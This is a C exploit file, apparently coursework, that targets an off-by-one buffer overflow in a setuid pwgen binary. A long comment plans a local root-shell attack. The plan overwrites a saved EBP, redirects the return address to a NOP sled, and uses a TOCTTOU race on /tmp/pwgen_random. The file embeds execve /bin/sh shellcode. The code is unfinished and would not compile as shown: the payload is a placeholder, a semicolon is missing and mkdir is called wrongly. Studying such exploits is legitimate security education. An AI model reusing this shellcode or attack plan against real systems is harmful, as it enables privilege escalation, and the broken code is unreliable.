#include<stdio.h>
#include<stdlib.h>
#include<unistd.h>
#include<string.h>

/**
 * Class A: buffer overflow
 *
 *  ?. Targetting return address
 *  1. get_entropy(buffer) called by fill_entropy() writes 1025 characters in 1024 byte buffer
 *     with buffer[1024]='\0'. 
 *  2. This makes the caller's(parse_args()) value of previous $EBP from 0xffbfdc98 to 0xffbfdd00
 *  3. i.e. EBP is dragged down by 152.
 *  4. So return address of parse_args = new EBP - 4 = old EBP + 148
 *  5. Since args is 86 bytes(but takes up 2 more bytes since a word is 4 byte) and buffer is 512,
 *     new return address is at around: old buffer[(512+88)-148] = old buffer[452].
 *  
 *  ?. Dealing with side effects of overflow
 *  1. changing EBP of parse_args() causes its parameters out of their positions
 *  2. So, after fill_entropy(), when it loops back to check for the next command line argument,
 *     it will face segmantation fault.
 *  3. So, we need to set new `argc` to 0
 *    3.1. From GDB, I found that, &argc == $ebp+12 instead of $ebp+8, have no clue why, but only 
 *         parse_args is like this:/
 *  4. SO, new `argc` is in old buffer[(512+88+12)-152] = old buffer[460]
 *  
 *  ?. How to write to buffer?
 *  1. buffer is used only when 
 *    1.1 parsing `-e` argument and
 *    1.2 without `optarg` and
 *    1.3 check_perms() returns false
 *  2. check_perms() returns false when /tmp/pwgen_random is not deleted after unlink("/tmp/pwgen_random")
 *  3. This can be done if there is a directory named "/tmp/pwgen_random".
 *  4. pwgen copies argv[0] into the buffer. 
 *     i.e. execve(<pwgen address>, [<payload>, "-e", NULL], NULL) will fill in buffer with payload
 *  
 *  ??. PROBLEM
 *  We need to write into buffer first, so that the memory is under compromized state once
 *  fill_entropy() spoils EBP. AND in order to write into buffer, we need to make check_perms()
 *  false.
 *  But if check_perms() is false, than fill_entropy() will not be called. :/
 *  
 *  ??. Possible solution: TOCTTOU
 *  Maybe I can create directory /tmp/pwgen_random before first -e is parsed, then delete the directory
 *  before second -e is parsed. The problem is there is no waiting between parsings when check_perms()
 *  is false. 
 *  And maybe I can achieve that by having a ton of -e arguments?
 *  
 *  ?. Summery: Exploit scenario
 *  1. remove file /tmp/pwgen_random and create directory /tmp/pwgen_random
 *  2. make a string with following requirments and attach it to argv[0]
 *    2.1. *(long *)old buffer[452] includes pointer to NOPs. - ****this pointer won't be accurate.****
 *    2.2. *(int *)old buffer[460] includes 0 so that we won't face seg fault
 *    2.3. shellscript section. insert it far behind in the buffer as possible
 *    2.4. calculate for its starting address so that we can pass it to *(long *)old buffer[452]
 *    2.5. fill rest of the buffers with NOPs.
 *  3. run execve(target, [payload, -e, ..., -e, NULL], NULL)
 *    3.1. this will fill in the buffer with payload and start looping through all -e's
 *  4. run rmdir("/tmp/pwgen_random")
 *    4.1. if this was done before pwgen parsed all '-e', this will restore check_perms()'s functionality
 *  5. enter 1024 inputs to overflow entropy buffer - this overflows EBP
 *    5.1. the return address of the parse_args() now points to the payload
 *    5.2. argc of parse_args() is now 0, so parse_args() terminates the parse loop
 *  6. parse_args() returns to payload executing shall with root privilege
 *  
 *  ?Fixes
 *  This exploit uses the off-by-one overflow at pwgen.c:179. Such vulnerability can be fixed
 *  by changing the range of the loop from 1024 to 1024-1
 *  
 */

// 46 bytes including \0
static char shellcode[] =
  "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
  "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
  "\x80\xe8\xdc\xff\xff\xff/bin/sh";

static char TARGET[] = "/usr/local/bin/pwgen";

int main(int argc, char const *argv[]){

  char *pwgenArgs[200];
  int i;

  for(i=0;i<200;i++){
    pwgenArgs[i] = "-e";
  }
  pwgenArgs[199] = NULL;
  
  pwgenArgs[0] = "payload. NOTE: index +9 for 'WARNING: '";

  // make check_perms() fail
  unlink("/tmp/pwgen_random");
  mkdir("/tmp/pwgen_random");

  execve(TARGET, pwgenArgs, NULL)

  // remove directory for next exploits
  rmdir("/tmp/pwgen_random");
  return 0;
}
